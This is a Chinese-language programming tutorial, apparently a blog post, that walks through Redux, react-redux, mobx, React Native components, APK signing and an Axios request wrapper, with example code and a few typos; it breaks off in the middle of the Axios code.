INCREMENT, DECREMENT &#125; from &quot;./constant&quot;// redux中规定同步action指action的值为对象export const createIncrementAction = data =&gt; (&#123;type:INCREMENT, data&#125;)export const createDecrementAction = data =&gt; (&#123;type:DECREMENT, data&#125;)// redux中规定异步action指action的值为函数// 异步action中一般都会使用同步action，因此如果使用异步action，store会将dispatch传入// 异步action不是必须的，逻辑可以自己在组件中实现export const createIncrementAsyncAction = (data, time) =&gt; &#123; return (dispatch) =&gt; &#123; setTimeout(() =&gt; &#123; dispatch(createIncrementAction(data)) &#125;,time) &#125;&#125; 使用时需要利用redux-thunk库开启异步action支持 1234567891011/** * store * 暴露一个store对象 */import &#123; createStore, applyMiddleware &#125; from &#x27;redux&#x27;// 引入为count服务的reducerimport countReducer from &#x27;./countReducer&#x27;// 引入redux-thunk，用于支持异步actionimport thunk from &#x27;redux-thunk&#x27;export default createStore(countReducer, applyMiddleware(thunk)) react-redux react-redux是react官方开发的，为了实现react的redux支持 react-redux中将组件分类两类： 容器组件 UI组件 容器组件是UI组件的父组件，负责和redux进行通讯，可随意使用reduxAPI，且容器组件能够检测redux中state的改变，不需要再自己添加检测 UI组件中不能使用reduxAPI 容器组件负责将redux中保存的状态以及操作状态的方法传递给UI组件，并且通过props传递 UI组件就是我们常写的组件，而容器组件则需要使用react-redux的connect函数创建， connect函数包含两参数，然会一个函数： mapStateToProps，该函数的返回的对象将作为传递给UI组件的props，用于传递redux状态 mapDispatchToProps，该函数的返回的对象将作为传递给UI组件的props，用于传递redux操作状态的方法 返回的函数接收一个UI组件作为参数，最终返回一个容器组件 此外，react-redux还提供了Provider组件，用于自动的将store传递给所有容器组件 下面使用React-Redux来写一下之前的案例： 目录结构： 1234567891011121314src - container - Count - index.js // count组件 - redux - store.js // 管理Reducer - constant.js // 定义action对象中type类型的常量值 - actions - count.js // 为Count组件生产action对象 - reducers - count.js // 为Count组件提供共享数据 - App.js // 根组件 - index.js // 项目入口 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100/** * Count组件 */// 引入connect用于连接UI组件与容器组件import &#123; connect &#125; from &quot;react-redux&quot;;// 引入actionimport &#123; createDecrementAction, createIncrementAction, createIncrementAsyncAction &#125; from &quot;../../redux/actions/count&quot;;import React, &#123; Component &#125; from &quot;react&quot;;/** * 定义UI组件 */class Count extends Component &#123; constructor() &#123; super() this.state = &#123; selectNumber: &#x27;1&#x27;, &#125; &#125; increment = () =&gt; &#123; // 函数体 const &#123;selectNumber&#125; = this.state this.props.jia(selectNumber*1) // 分发一个action &#125; decrement = () =&gt; &#123; // 函数体 const &#123;selectNumber&#125; = this.state this.props.jian(selectNumber*1) &#125; incrementIfOdd = () =&gt; &#123; // 函数体 const &#123;selectNumber&#125; = this.state if(this.props.count % 2 !== 0)&#123; this.props.jia(selectNumber * 1) &#125; &#125; incrementAsync = () =&gt; &#123; // 函数体 const &#123;selectNumber&#125; = this.state this.props.jiaAsync(selectNumber * 1, 500) &#125; handleChange = (e) =&gt; &#123; const target = e.target const value = target.type === &quot;checkbox&quot; ? target.checked : target.value; const name = target.name this.setState(&#123; [name]: value &#125;) &#125; render() &#123; return ( &lt;div&gt; &lt;h2&gt;我是Count组件&lt;/h2&gt; &#123;/* 获取利用store，Reducer中的公共状态 */&#125; &lt;h4&gt;当前求和为：&#123;this.props.count&#125;&lt;/h4&gt; &lt;select name=&quot;selectNumber&quot; value=&#123;this.state.selectNumber&#125; onChange=&#123;this.handleChange&#125;&gt; &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt; &lt;/select&gt;&amp;nbsp; &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/button&gt;&amp;nbsp; &lt;button onClick=&#123;this.decrement&#125;&gt;-&lt;/button&gt;&amp;nbsp; &lt;button onClick=&#123;this.incrementIfOdd&#125;&gt;当前求和为奇数则加&lt;/button&gt;&amp;nbsp; &lt;button onClick=&#123;this.incrementAsync&#125;&gt;异步加&lt;/button&gt; &lt;/div&gt; ) &#125;&#125;/** * 定义容器组件 */// 需要连接UI组件与Redux的store，但store需要通过props传入该组件// connect函数包含两个参数，均为回到函数const CountContainer = connect( // mapStateToProps state =&gt; (&#123;count:state&#125;), // mapDispatchToProps // dispatch =&gt; // (&#123; // jia:(number) =&gt; dispatch(createIncrementAction(number)), // jian:(number) =&gt; dispatch(createDecrementAction(number)), // jiaAsync:(number, time) =&gt; dispatch(createIncrementAsyncAction(number, time)), // &#125;) // 还剋使用如下简写方式触发react-redux的默认分发，即自动调用dispatch &#123; jia:createIncrementAction, jian:createDecrementAction, jiaAsync:createIncrementAsyncAction, &#125;)(Count)export default CountContainer 1234567891011/** * store * 暴露一个store对象 */import &#123; createStore, applyMiddleware &#125; from &#x27;redux&#x27;// 引入为count服务的reducerimport countReducer from &#x27;./reducers/count&#x27;// 引入redux-thunk，用于支持异步actionimport thunk from &#x27;redux-thunk&#x27;export default createStore(countReducer, applyMiddleware(thunk)) 123456/** * 该模块用于定义action对象中type类型的常量值 */export const INCREMENT = &#x27;increment&#x27;export const DECREMENT = &#x27;decrement&#x27; 123456789101112131415161718192021/** * countActionCreator.js * 该组件专门为Count组件生产action对象 */import &#123; INCREMENT, DECREMENT &#125; from &quot;../constant&quot;// redux中规定同步action指action的值为对象export const createIncrementAction = data =&gt; (&#123;type:INCREMENT, data&#125;)export const createDecrementAction = data =&gt; (&#123;type:DECREMENT, data&#125;)// redux中规定异步action指action的值为函数// 异步action中一般都会使用同步action，因此如果使用异步action，store会将dispatch传入// 异步action不是必须的，逻辑可以自己在组件中实现export const createIncrementAsyncAction = (data, time) =&gt; &#123; return (dispatch) =&gt; &#123; setTimeout(() =&gt; &#123; dispatch(createIncrementAction(data)) &#125;,time) &#125;&#125; 1234567891011121314151617181920212223/** * countReducer * 该文件用于创建一个为Count组件服务的reducer，本质是一个函数 * reducer函数将接收到两个参数，分别为：1. 之前的状态preState，动作对象action */import &#123; INCREMENT, DECREMENT &#125; from &quot;../constant&quot;const initState = 0// 事实上该函数是一个纯函数export default function countReducer(preState = initState, action) &#123; console.log(preState, action) // 从action对象中解析type、data const &#123;type, data&#125; = action // 根据type类型判断操作 switch (type) &#123; case INCREMENT: return preState + data case DECREMENT: return preState - data default: return preState &#125;&#125; 使用react-redux实现数据共享 现有两个组件 count person 希望这两个组件使用的state能够相互共享。 目录结构如下： 123456789101112131415161718src - container - Count - index.js // count组件 - Person - index.js // person组件 - redux - store.js // 管理Reducer - constant.js // 定义action对象中type类型的常量值 - actions - count.js // 为Count组件生成action对象 - person.js // 为Person组件生成action对象 - reducers - count.js // 为Count组件提供共享数据 - person.js // 为Person组件提供共享数据 - App.js // 根组件 - index.js // 项目入口 Count组件与前文提到的案例相同再次不赘述。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import React, &#123; Component &#125; from &quot;react&quot;;import &#123; nanoid &#125; from &quot;nanoid&quot;;import &#123; connect &#125; from &quot;react-redux&quot;;import &#123; createAddPersonAction &#125; from &#x27;../../redux/actions/person&#x27;class Person extends Component &#123; constructor() &#123; super() this.state = &#123; userName: &#x27;&#x27;, userAge: &#x27;&#x27;, &#125; &#125; handleChange = e =&gt; &#123; const target = e.target; const value = target.type === &quot;checkbox&quot; ? target.checked : target.value; const name = target.name; this.setState(&#123; [name]: value &#125;) &#125; addPerson = e =&gt; &#123; const &#123;userName, userAge&#125; = this.state const personObj = &#123;id:nanoid(), name: userName, age: userAge&#125; this.props.add_person(personObj) this.setState(&#123; userName: &#x27;&#x27;, userAge: &#x27;&#x27;, &#125;) // console.log(personObj); &#125; render() &#123; return ( &lt;div&gt; &lt;h2&gt;我是Pserson组件,上方组件和为&#123;this.props.sum&#125;&lt;/h2&gt; &lt;input name=&quot;userName&quot; type=&quot;text&quot; placeholder=&quot;输入名字&quot; value=&#123;this.state.userName&#125; onChange=&#123;this.handleChange&#125; /&gt; &lt;input name=&quot;userAge&quot; type=&quot;text&quot; placeholder=&quot;输入年龄&quot; value=&#123;this.state.userAge&#125; onChange=&#123;this.handleChange&#125; /&gt; &lt;button onClick=&#123;this.addPerson&#125;&gt;添加&lt;/button&gt; &lt;ul&gt; &#123; this.props.persons.map((person) =&gt; &#123; return &lt;li key=&#123;person.id&#125;&gt;&#123;person.name&#125;--&#123;person.age&#125;&lt;/li&gt; &#125;) &#125; &lt;/ul&gt; &lt;/div&gt; ) &#125;&#125;export default connect( state =&gt; (&#123; persons: state.persons, sum: state.count, &#125;), &#123; add_person: createAddPersonAction, &#125;)(Person) 1234import &#123; ADD_PERSON &#125; from &quot;../constant&quot;;// 创建增加一个人的actionexport const createAddPersonAction = (personObj) =&gt; (&#123;type:ADD_PERSON, data: personObj&#125;) 12345678910111213141516import &#123; ADD_PERSON &#125; from &quot;../constant&quot;;// 初始化人列表const initState = [&#123;id:&#x27;001&#x27;, name:&#x27;init&#x27;, age:0&#125;]export default function personReducer(perState = initState, action) &#123; const &#123;type, data&#125; = action switch (type) &#123; case ADD_PERSON: return [data,...perState] default: return perState; &#125;&#125; 12345678910111213141516171819/** * store * 暴露一个store对象 */import &#123; createStore, applyMiddleware, combineReducers &#125; from &#x27;redux&#x27;// 引入为count服务的reducerimport countReducer from &#x27;./reducers/count&#x27;// 引入为person服务的reducerimport personReducer from &#x27;./reducers/person&#x27;// 引入redux-thunk，用于支持异步actionimport thunk from &#x27;redux-thunk&#x27;const allReducer = combineReducers(&#123; count: countReducer, persons: personReducer, &#125;)export default createStore(allReducer, applyMiddleware(thunk)) 纯函数 上文中提到redux的reducer必须是一个纯函数，那么什么样的函数是纯函数呢？ 如果一个函数具有如下特性，则认为该函数是一个纯函数： 只要给定同样的输入，则必定返回同样的输出。 纯函数应该具有如下约束： 不得改写参数数据 不会产生任何副作用，例如网络请求，输入和输出设备 不能调用Data.now()或者Math.random()等不纯函数 redux开发者工具 为浏览器安装Redux Dev Tools插件 为项目安装库redux-devtools-extension 在store.js中引入 import &#123; composeWithDevTools &#125; from 'redux-devtools-extension' 修改暴露为： export default createStore(allReducer, composeWithDevTools(applyMiddleware(thunk))) 也可以使用如下方式开启调试，无需下载redux-devtools-extension库： import &#123;compose&#125; from 'redux' export default createStore(allReduers, composeEnhancers(applyMiddleware(thunk))) 案例最终版 如上案例进行优化后，例如使用index将所有reducer汇总，统一暴露，尽量触发对象简写方式等。 项目结构如下： 12345678910111213141516171819src - container - Count - index.js // count组件 - Person - index.js // person组件 - redux - store.js // 管理Reducer - constant.js // 定义action对象中type类型的常量值 - actions - count.js // 为Count组件生成action对象 - person.js // 为Person组件生成action对象 - reducers - index.js // 将所有reducers汇总并暴露 - count.js // 为Count组件提供共享数据 - person.js // 为Person组件提供共享数据 - App.js // 根组件 - index.js // 项目入口 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103/** * Count组件 */// 引入connect用于连接UI组件与容器组件import &#123; connect &#125; from &quot;react-redux&quot;;// 引入actionimport &#123; increment, incrementAsync, decrement &#125; from &quot;../../redux/actions/count&quot;;import React, &#123; Component &#125; from &quot;react&quot;;/** * 定义UI组件 */class Count extends Component &#123; constructor() &#123; super() this.state = &#123; selectNumber: &#x27;1&#x27;, &#125; &#125; increment = () =&gt; &#123; // 函数体 const &#123;selectNumber&#125; = this.state this.props.increment(selectNumber*1) // 分发一个action &#125; decrement = () =&gt; &#123; // 函数体 const &#123;selectNumber&#125; = this.state this.props.decrement(selectNumber*1) &#125; incrementIfOdd = () =&gt; &#123; // 函数体 const &#123;selectNumber&#125; = this.state if(this.props.count % 2 !== 0)&#123; this.props.increment(selectNumber * 1) &#125; &#125; incrementAsync = () =&gt; &#123; // 函数体 const &#123;selectNumber&#125; = this.state this.props.incrementAsync(selectNumber * 1, 500) &#125; handleChange = (e) =&gt; &#123; const target = e.target const value = target.type === &quot;checkbox&quot; ? target.checked : target.value; const name = target.name this.setState(&#123; [name]: value &#125;) &#125; render() &#123; return ( &lt;div&gt; &lt;h2&gt;我是Count组件,下方组件总人数为&#123;this.props.personNum&#125;&lt;/h2&gt; &#123;/* 获取利用store，Reducer中的公共状态 */&#125; &lt;h4&gt;当前求和为：&#123;this.props.count&#125;&lt;/h4&gt; &lt;select name=&quot;selectNumber&quot; value=&#123;this.state.selectNumber&#125; onChange=&#123;this.handleChange&#125;&gt; &lt;option value=&quot;1&quot;&gt;1&lt;/option&gt; &lt;option value=&quot;2&quot;&gt;2&lt;/option&gt; &lt;option value=&quot;3&quot;&gt;3&lt;/option&gt; &lt;/select&gt;&amp;nbsp; &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/button&gt;&amp;nbsp; &lt;button onClick=&#123;this.decrement&#125;&gt;-&lt;/button&gt;&amp;nbsp; &lt;button onClick=&#123;this.incrementIfOdd&#125;&gt;当前求和为奇数则加&lt;/button&gt;&amp;nbsp; &lt;button onClick=&#123;this.incrementAsync&#125;&gt;异步加&lt;/button&gt; &lt;/div&gt; ) &#125;&#125;/** * 定义容器组件 */// 需要连接UI组件与Redux的store，但store需要通过props传入该组件// connect函数包含两个参数，均为回到函数const CountContainer = connect( // mapStateToProps state =&gt; (&#123; count:state.count, personNum:state.persons.length, &#125;), // mapDispatchToProps // dispatch =&gt; // (&#123; // jia:(number) =&gt; dispatch(createIncrementAction(number)), // jian:(number) =&gt; dispatch(createDecrementAction(number)), // jiaAsync:(number, time) =&gt; dispatch(createIncrementAsyncAction(number, time)), // &#125;) // 还可使用如下简写方式触发react-redux的默认分发，即自动调用dispatch &#123; increment, decrement, incrementAsync, &#125;)(Count)export default CountContainer 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import React, &#123; Component &#125; from &quot;react&quot;;import &#123; nanoid &#125; from &quot;nanoid&quot;;import &#123; connect &#125; from &quot;react-redux&quot;;import &#123; addPerson &#125; from &#x27;../../redux/actions/person&#x27;class Person extends Component &#123; constructor() &#123; super() this.state = &#123; userName: &#x27;&#x27;, userAge: &#x27;&#x27;, &#125; &#125; handleChange = e =&gt; &#123; const target = e.target; const value = target.type === &quot;checkbox&quot; ? target.checked : target.value; const name = target.name; this.setState(&#123; [name]: value &#125;) &#125; addPerson = e =&gt; &#123; const &#123;userName, userAge&#125; = this.state const personObj = &#123;id:nanoid(), name: userName, age: userAge&#125; this.props.addPerson(personObj) this.setState(&#123; userName: &#x27;&#x27;, userAge: &#x27;&#x27;, &#125;) // console.log(personObj); &#125; render() &#123; return ( &lt;div&gt; &lt;h2&gt;我是Pserson组件,上方组件和为&#123;this.props.sum&#125;&lt;/h2&gt; &lt;input name=&quot;userName&quot; type=&quot;text&quot; placeholder=&quot;输入名字&quot; value=&#123;this.state.userName&#125; onChange=&#123;this.handleChange&#125; /&gt; &lt;input name=&quot;userAge&quot; type=&quot;text&quot; placeholder=&quot;输入年龄&quot; value=&#123;this.state.userAge&#125; onChange=&#123;this.handleChange&#125; /&gt; &lt;button onClick=&#123;this.addPerson&#125;&gt;添加&lt;/button&gt; &lt;ul&gt; &#123; this.props.persons.map((person) =&gt; &#123; return &lt;li key=&#123;person.id&#125;&gt;&#123;person.name&#125;--&#123;person.age&#125;&lt;/li&gt; &#125;) &#125; &lt;/ul&gt; &lt;/div&gt; ) &#125;&#125;export default connect( state =&gt; (&#123; persons: state.persons, sum: state.count, &#125;), &#123; addPerson, &#125;)(Person) 123456789101112131415161718192021/** * countActionCreator.js * 该组件专门为Count组件生产action对象 */import &#123; INCREMENT, DECREMENT &#125; from &quot;../constant&quot;// redux中规定同步action指action的值为对象export const increment = data =&gt; (&#123;type:INCREMENT, data&#125;)export const decrement = data =&gt; (&#123;type:DECREMENT, data&#125;)// redux中规定异步action指action的值为函数// 异步action中一般都会使用同步action，因此如果使用异步action，store会将dispatch传入// 异步action不是必须的，逻辑可以自己在组件中实现export const incrementAsync = (data, time) =&gt; &#123; return (dispatch) =&gt; &#123; setTimeout(() =&gt; &#123; dispatch(increment(data)) &#125;,time) &#125;&#125; 1234import &#123; ADD_PERSON &#125; from &quot;../constant&quot;;// 创建增加一个人的actionexport const addPerson = (personObj) =&gt; (&#123;type:ADD_PERSON, data: personObj&#125;) 12345678910111213// 引入为count服务的reducerimport count from &#x27;./count&#x27;// 引入为person服务的reducerimport persons from &#x27;./person&#x27;// 用于汇总多个reducerimport &#123; combineReducers &#125; from &#x27;redux&#x27;// 当key，value同名时触发对象简写方式export default combineReducers(&#123; count, persons, &#125;) 1234567891011121314151617181920212223/** * countReducer * 该文件用于创建一个为Count组件服务的reducer，本质是一个函数 * reducer函数将接收到两个参数，分别为：1. 之前的状态preState，动作对象action */import &#123; INCREMENT, DECREMENT &#125; from &quot;../constant&quot;const initState = 0// 事实上该函数是一个纯函数export default function countReducer(preState = initState, action) &#123; console.log(preState, action) // 从action对象中解析type、data const &#123;type, data&#125; = action // 根据type类型判断操作 switch (type) &#123; case INCREMENT: return preState + data case DECREMENT: return preState - data default: return preState &#125;&#125; 12345678910111213141516import &#123; ADD_PERSON &#125; from &quot;../constant&quot;;// 初始化人列表const initState = [&#123;id:&#x27;001&#x27;, name:&#x27;init&#x27;, age:0&#125;]export default function personReducer(perState = initState, action) &#123; const &#123;type, data&#125; = action switch (type) &#123; case ADD_PERSON: return [data,...perState] default: return perState; &#125;&#125; 1234567/** * 该模块用于定义action对象中type类型的常量值 */export const INCREMENT = &#x27;increment&#x27;export const DECREMENT = &#x27;decrement&#x27;export const ADD_PERSON = &#x27;add_person&#x27; 12345678910111213141516171819/** * store * 暴露一个store对象 */import &#123; createStore, applyMiddleware &#125; from &#x27;redux&#x27;// 引入汇总reducerimport allReducer from &#x27;./reducers&#x27;// 引入redux-thunk，用于支持异步actionimport thunk from &#x27;redux-thunk&#x27;// 引入开发者工具import &#123; composeWithDevTools &#125; from &#x27;redux-devtools-extension&#x27;export default createStore(allReducer, composeWithDevTools(applyMiddleware(thunk))) 123456789101112131415161718import React, &#123; Component &#125; from &quot;react&quot;;import Count from &#x27;./containers/Count&#x27;import Person from &quot;./containers/Person&quot;;class App extends Component &#123; render() &#123; return ( &lt;div&gt; &lt;Count /&gt; &lt;hr /&gt; &lt;Person /&gt; &lt;/div&gt; ) &#125;&#125;export default App 12345678910111213import React from &quot;react&quot;;import reactDom from &quot;react-dom&quot;;import App from &#x27;./App&#x27;import store from &#x27;./redux/store&#x27;import &#123; Provider &#125; from &#x27;react-redux&#x27;reactDom.render( &lt;Provider store=&#123;store&#125;&gt; &lt;App&gt;&lt;/App&gt; &lt;/Provider&gt;, document.getElementById(&#x27;root&#x27;)) React-Native 项目结构 react-native目录结构简介： 12345678- android 与安卓客户端编译相关的配置- ios 与ios哭护短编译相关的配置- .eslintrc.js 代码风格配置- .prettierrc.js 代码格式化风格配置- App.js 项目的根组件- index.js 项目的入口文件 - package.json 项目第三方包相关信息- babel RN布局 flex布局 所有容器默认为felxbox 并且默认为纵向排列，即felx-direction: colum 样式继承 在RN中样式没有继承关系 单位 在RN中不能为表示宽高的数字增加单位，RN会自动处理单位。 RN中可以使用百分比表示宽高。 RN中的默认单位为dp px与dp转换： dp宽高=屏幕宽高(px)∗元素宽高(px)/设计稿宽高(px)dp宽高 = 屏幕宽高(px) * 元素宽高(px) / 设计稿宽高(px) dp宽高=屏幕宽高(px)∗元素宽高(px)/设计稿宽高(px) 可以通过构造如下工具来解决px转dp的问题 12345678910import &#123;Dimensions&#125; from &quot;react-native&quot;export const screenWidth = Dimensions.get(&quot;window&quot;).width;export const screenHeight = Dimension.get(&quot;window&quot;).height;/** * 次数假设设计稿宽为375 */export const pxToDp = (elePx) =&gt; screenWidth * elePx / 375 屏幕宽高 123import &#123;Dimensions&#125; from &quot;react-native&quot;;const screenWidth = Math.round(Dimensions.get(&#x27;window&#x27;).width);const screenHeight = Math.round(Dimensions.get(&#x27;window&#x27;).height); 变换 1&lt;Text style=&#123;&#123;transform:[&#123;translateY:300&#125;, &#123;scale:2&#125;]&#125;&#125;&gt;变换&lt;/Text&gt; 标签 View 相当于div 不支持字体大小，字体颜色 不能直接放文本内容 不支持直接绑定点击事件（一般使用TouchableOpacity代替） Text 文本标签 文本标签，可以设置字体颜色、大小 支持绑定点击事件 TouchableOpacity 可以绑定点击事件的块标签 相当于块容器 支持绑定点击事件onPress 可以设置点击时的透明度 1&lt;TouchableOpecity activeOpacity=&#123;0.5&#125; onPress=&#123;this.handleOnPress&#125;&gt;&lt;/TouchableOpecity&gt; Image 图片标签 渲染本地图片时 1&lt;Image source=&#123;require(&quot;../img.png&quot;)&#125; /&gt; 渲染网络图片 1&lt;Image source=&#123;&#123;url:&quot;https://z3.ax1x.com/2021/08/05/fego40.png&quot;&#125;&#125; style=&#123;&#123;width:200,height:300&#125;&#125; /&gt; ​ 注意一定要加宽高，不然无法显示 Android设备上渲染GIF和WebP 默认不支持，需要在Android/app/build/gradle中手动添加模块： 123456789dependencies &#123; // 如果需要支持Android4.0之前的版本 implementation &#x27;com.facebook.fresco:animated-base-support:1.3.0&#x27; // GIF支持 implementation &#x27;com.facebook.fresco:animated-gif:2.0.0&#x27; // Webp格式，包括Webp动图支持 implementation &#x27;com.facebook.fresco:animated-webp:2.1.0&#x27; implementation &#x27;com.facebook.fresco:webpsupport:2.0.0&#x27;&#125; 注意当更改依赖时需要重启调试 ImageBackground 用于实现带有背景的块级元素 123&lt;ImageBackground source=&#123;...&#125; style=&#123;&#123;width:&#x27;100%&#x27;, height: &#x27;100%&#x27;&#125;&#125;&gt; &lt;Text&gt;Inside&lt;/Text&gt;&lt;/ImageBackground&gt; 必须就有style属性 TextInpute 输入框组件 通过onChangeText事件来获取输入框的值 1&lt;TextInpute onChangeText=&#123;handleChangeText&#125; &gt;&lt;/TextInpute&gt; 注意他初始状态是没有样式的 调试 RN有两种调试方式： 谷歌浏览器 不能查看标签结构 不能查看网络请求 使用RN推荐的工具react-native-debugger 可以查看标签结构 不能查看网络请求 想要查看网络请求则需要进行如下配置： 找到项目入口文件index.js 加入以下代码： 1GLOBAL.XMLHttpRequest = GLOBAL.originalXMLHttpRequest || GLOBAL.XMLHttpRequest this指向问题 可以使用如下四种方式解决this指向问题： 1234567891011121314151617181920212223242526272829303132333435363738394041424344import React, &#123; Component &#125; from &#x27;react&#x27;import &#123; View, Text &#125; from &#x27;react-native&#x27;class Index extends Component &#123; state = &#123; num:100 &#125; // 丢失 state handlePress1() &#123; console.log(this.state); &#125; // 正常 handlePress2 = () =&gt; &#123; console.log(this.state); &#125; // 正常 handlePress3() &#123; console.log(this.state) &#125; // 正常 handlePress4() &#123; console.log(this.state) &#125; // 正常 handlePress5() &#123; console.log(this.state) &#125; constructor() &#123; super() this.handlePress = this.handlePress.bind(this); &#125; // 正常 render() &#123; return ( &lt;View&gt; &#123;/* 导致事件函数中获取不到 */&#125; &lt;Text onPress=&#123;this.handlePress1&#125; &gt;事件1&lt;/Text&gt; &lt;Text onPress=&#123;this.handlePress2&#125; &gt;事件2&lt;/Text&gt; &lt;Text onPress=&#123;this.handlePress3.bind(this)&#125; &gt;事件3&lt;/Text&gt; &lt;Text onPress=&#123;()=&gt;this.handlePress4()&#125;&gt;事件4&lt;/Text&gt; &lt;Text onPress=&#123;handlePress5()&#125;&gt;事件5&lt;/Text&gt; &lt;/View&gt; ) &#125;&#125; RN生命周期 与React相同 mobx react中全局数据管理库，可以简单实现数据的跨组件共享 安装依赖 mobx核心库 mobx-react方便在react中使用mobx技术的库 @babel/plugin-proposal-decorators让rn项目支持es7中的装饰器语法库 1yarn add mobx mobx-react @babel/plugin-proposal-decorators 添加配置 在babel.config.js添加如下配置： 123plugins: [ [&#x27;@babel/plugin-proposal-decorators&#x27;, &#123;&#x27;legacy&#x27;:true&#125;]] 新建全局数据文件 新建文件mobx\\index.js添加如下配置 12345678910111213import &#123;observable, action&#125; from &#x27;mbox&#x27;class RootStore &#123; // es7装饰器语法，使用Object.defineProperty实现 // observable 表示数据可以监控，表示是全局数据 @observable name = &quot;Hello&quot; // action行为 表示 changeName是个可以修改全局共享数据的方法 @action changeName(name) &#123; this.name = name; &#125;&#125;export default new RootStore() 挂载 通过provider来挂载和传递 123456789101112131415import React, &#123; Component &#125; from &#x27;react&#x27;;import &#123; View &#125; from &#x27;react-native&#x27;;import rootStore from &#x27;./mobx&#x27;;import &#123; Provider &#125; from &#x27;mbox-react&#x27;;class Index extends Component &#123; render() &#123; return ( &lt;View&gt; &lt;Provider rootStore=&#123;rootStore&#125;&gt; &lt;Sub1&gt;&lt;/Sub1&gt; &lt;/Provider&gt; &lt;/View&gt; ) &#125;&#125; 使用 12345678910111213141516171819import React, &#123; Component &#125; from &#x27;react&#x27;;import &#123; View, Text &#125; from &#x27;react-native&#x27;;import &#123; inject,observer &#125; from &#x27;mbox-react&#x27;;@inject(&quot;rootStore&quot;) // 注入Provider的属性名，用来获取全局数据@observer // 接收全局遍历改变，当全局发生改变，组件重新渲染从而显示最新数据class Sub1 extends Component &#123; changeName = () =&gt; &#123; // 修改全局数据 this.props.rootStore.changeName(&quot;goodbye&quot;); &#125; render() &#123; return ( &lt;View&gt; &lt;Text onPress=&#123;this.changeName&#125;&gt;&#123;this.props.rootStore.name&#125;&lt;/Text&gt; &lt;/View&gt; ); &#125;&#125; RN常用图表库 [Echarts](Documentation - Apache ECharts) (原生JS) [native-echarts](somonus/react-native-echarts: Echarts for react-native. The react-naitve chart. (github.com)) Echarts的react第三方封装版本 已停更，使用Echarts版本停留在3.0 安卓打包需要手动添加assets [victory](Victory | Getting Started (formidable.com)) AntV RN打包APK 生成签名密钥 使用如下命令进入jdk\\bin目录，利用jdk提供的ketytool生成一个私有密钥： 12$ cd D:\\java\\jdk8\\bin\\$ keytool -genkeypair -v -storetype PKCS12 -keystore my-release-key.keystore -alias my-key-alias -keyalg RSA -keysize 2048 -validity 1000 这条命令会要求你输入密钥库（keystore）和对应密钥的密码，然后设置一些发行相关的信息。最后生成一个叫做my-release-key.keystore的密钥库文件。 在运行上面这条语句之后，密钥库里应该已经生成了一个单独的密钥，有效期为 10000 天。–alias 参数后面的别名是将来为应用签名时所需要用到的。 设置Gradle变量 把my-release-key.keystore文件放到工程中的android/app文件夹下。 编辑~/.gradle/gradle.properties（全局配置，对所有项目有效）或是项目目录/android/gradle.properties（项目配置，只对所在项目有效）。如果没有gradle.properties文件就自己创建一个，添加如下的代码： 1234MYAPP_RELEASE_STORE_FILE=my-release-key.keystoreMYAPP_RELEASE_KEY_ALIAS=my-key-aliasMYAPP_RELEASE_STORE_PASSWORD=*****MYAPP_RELEASE_KEY_PASSWORD=***** 上面的这些会作为 gradle 的变量，在后面的步骤中可以用来给应用签名。 将签名加入项目 编辑项目目录下的android/app/build.gradle，添加如下的签名配置： 12345678910111213141516171819202122...android &#123; ... defaultConfig &#123; ... &#125; signingConfigs &#123; release &#123; if (project.hasProperty(&#x27;MYAPP_RELEASE_STORE_FILE&#x27;)) &#123; storeFile file(MYAPP_RELEASE_STORE_FILE) storePassword MYAPP_RELEASE_STORE_PASSWORD keyAlias MYAPP_RELEASE_KEY_ALIAS keyPassword MYAPP_RELEASE_KEY_PASSWORD &#125; &#125; &#125; buildTypes &#123; release &#123; ... signingConfig signingConfigs.release &#125; &#125;&#125;... 生成发行 APK 包 运行以下命令生成APK： 12$ cd android$ ./gradlew assembleRelease Gradle 的assembleRelease参数会把所有用到的 JavaScript 代码都打包到一起，然后内置到 APK 包中。如果想调整下这个行为（比如 js 代码以及静态资源打包的默认文件名或是目录结构等），可以在android/app/build.gradle文件中进行配置。 生成的 APK 文件位于android/app/build/outputs/apk/release/app-release.apk 测试 输入以下命令可以在设备上安装发行版本： 1$ npx react-native run-android --variant=release 注意--variant=release参数只能在完成了上面的签名配置之后才可以使用。 RN网络请求——Axios 安装 使用如下命令安装Axios： 12$ npm install axios$ yarn add react-native-axios 安装antdUI组件库： 1$ npm install antd-mobile --save 封装 直接使用Axios进行请求时，为了完成请求地址拼接，参数设置，异步操作处理，JSON格式转化等等操作，将会产生许多冗余代码，为了简化代码，需要对Axios进行二次封装： 在src目录下创建utils目录，该目录下创建http目录 在http目录下创建文件httpBaseConfig.js与request.js httpBaseConfig.js用于配置服务器域名，端口号，API地址 request.js用于编写Axios请求逻辑 Axios基于ES6中的Promise对象进行开发，因此可以使用then链来处理同步问题，而ES7加入async函数后，可以在async函数中使用await关键词实现更方便的处理，await会阻塞后续代码直到得到返回的Promise对象，具体可以参考如下博客： 理解 JavaScript 的 async/await - SegmentFault 思否 Axios还为我们提供了方便的基础设置、拦截器等操作，通过设置回调函数可以完成发送请求前，和得到返回的数据后进行处理。 最后我们将不同类型的请求封装到一个http类中。 最后得到的request.js如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101import axios from &quot;axios&quot;;import baseConfig from &quot;./httpBaseConfig&quot;;// 默认域名axios.defaults.baseURL = baseConfig.baseUrl + &quot;:&quot; + baseConfig.port + baseConfig.prefix;// 默认请求头axios.defaults.headers[&quot;Content-Type&quot;] = &quot;application/json&quot;;// 响应时间axios.defaults.timeout = 10000;// 请求拦截器axios.interceptors.request.use( (config) =&gt; &#123; // TODO:在发送前做点什么 // showLoading(); //显示加载动画 return config; &#125;, (error) =&gt; &#123; // hideLoading(); //关闭加载动画 // TODO:对响应错误做点什么 return Promise.reject(error); &#125;);// 响应拦截器axios.interceptors.response.use( (response) =&gt; &#123; // TODO:请求返回数据后做点什么 if (response.status === &quot;200&quot; || response.status === 200) &#123; return response.data.data || response.data; &#125; else &#123; // 